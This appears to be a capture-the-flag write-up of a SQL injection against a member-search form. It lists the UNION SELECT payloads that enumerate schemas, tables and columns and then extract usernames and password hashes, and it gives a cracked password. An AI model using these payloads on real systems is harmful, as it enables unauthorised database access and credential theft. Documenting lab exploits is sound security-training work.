# SQL Injection

The member page `/?page=member` ontains a classic HTTP form to search for a member by their ID.  
We can quickly see that the input is vulnerable to SQL injection:  
If we enter something invalid, like a letter (since IDs can only be numeric), we see an SQL error displayed on the page.  

Let's gather some information about the database:  

- `0 UNION  SELECT SCHEMA_NAME,2 FROM INFORMATION_SCHEMA.SCHEMATA` : This query can give us informations about schematas.  

- `0 UNION  SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES` : This one about tables.  

- `0 UNION  SELECT COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS` : This one about columns.  

With all this information, we are able to extract usernames and passwords from `Member_Brute_Force.db_default`

- `0 UNION SELECT username, password FROM Member_Brute_Force.db_default`

The password obtained, 3bf1114a986ba87ed28fc1b5884fc2f8, is hashed.  
Using a hash decryption tool, we can retrieve the original password:  

> shadow 